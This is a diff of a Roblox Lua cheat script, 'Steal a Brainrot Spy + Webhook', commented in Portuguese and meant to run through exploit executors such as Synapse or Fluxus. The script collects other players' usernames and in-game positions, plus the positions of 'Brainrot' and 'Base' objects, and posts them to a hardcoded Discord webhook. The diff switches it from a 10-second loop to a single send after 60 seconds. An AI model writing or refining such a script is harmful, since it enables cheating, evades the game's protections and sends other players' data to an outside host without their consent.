@@ -1,6 +1,6 @@
 --[[ 
 Steal a Brainrot Spy + Webhook
-Envia todas as entidades importantes para o Discord
+Envia todas as entidades importantes (Players, Brainrots, Bases) UMA ÚNICA VEZ
 --]]
 
 local HttpService = game:GetService("HttpService")
@@ -11,12 +11,9 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1418742003696402545/YEJJ3x
 
 -- Função para enviar dados para webhook
 local function sendWebhook(content)
-    local data = {
-        ["content"] = content
-    }
+    local data = { ["content"] = content }
     local json = HttpService:JSONEncode(data)
     
-    -- requisitando via executor
     local request = http_request or request or syn and syn.request or fluxus and fluxus.request
     if request then
         request({
@@ -32,44 +29,54 @@ end
 
 -- Função para capturar players
 local function getPlayers()
+    local result = {}
     for _, player in pairs(Players:GetPlayers()) do
         if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
             local pos = player.Character.HumanoidRootPart.Position
-            sendWebhook("🟢 Player: "..player.Name.." | Position: "..tostring(pos))
+            table.insert(result, "🟢 Player: "..player.Name.." | Position: "..tostring(pos))
         end
     end
+    return result
 end
 
 -- Função para capturar Brainrots
 local function getBrainrots()
+    local result = {}
     local brainrotFolder = Workspace:FindFirstChild("Brainrots")
     if brainrotFolder then
         for _, brainrot in pairs(brainrotFolder:GetChildren()) do
             if brainrot:IsA("Model") and brainrot:FindFirstChild("HumanoidRootPart") then
                 local pos = brainrot.HumanoidRootPart.Position
-                sendWebhook("🧠 Brainrot: "..brainrot.Name.." | Position: "..tostring(pos))
+                table.insert(result, "🧠 Brainrot: "..brainrot.Name.." | Position: "..tostring(pos))
             end
         end
     end
+    return result
 end
 
--- Função para capturar bases
+-- Função para capturar Bases
 local function getBases()
+    local result = {}
     local baseFolder = Workspace:FindFirstChild("Bases")
     if baseFolder then
         for _, base in pairs(baseFolder:GetChildren()) do
             if base:IsA("Model") and base:FindFirstChild("HumanoidRootPart") then
                 local pos = base.HumanoidRootPart.Position
-                sendWebhook("🏠 Base: "..base.Name.." | Position: "..tostring(pos))
+                table.insert(result, "🏠 Base: "..base.Name.." | Position: "..tostring(pos))
             end
         end
     end
+    return result
 end
 
--- Loop contínuo para monitorar
-while true do
-    getPlayers()
-    getBrainrots()
-    getBases()
-    wait(10) -- envia a cada 10 segundos
+-- Espera 60 segundos e envia tudo de uma vez
+task.wait(60)
+
+local allEntities = {}
+for _, v in pairs(getPlayers()) do table.insert(allEntities, v) end
+for _, v in pairs(getBrainrots()) do table.insert(allEntities, v) end
+for _, v in pairs(getBases()) do table.insert(allEntities, v) end
+
+if #allEntities > 0 then
+    sendWebhook(table.concat(allEntities, "\n"))
 end
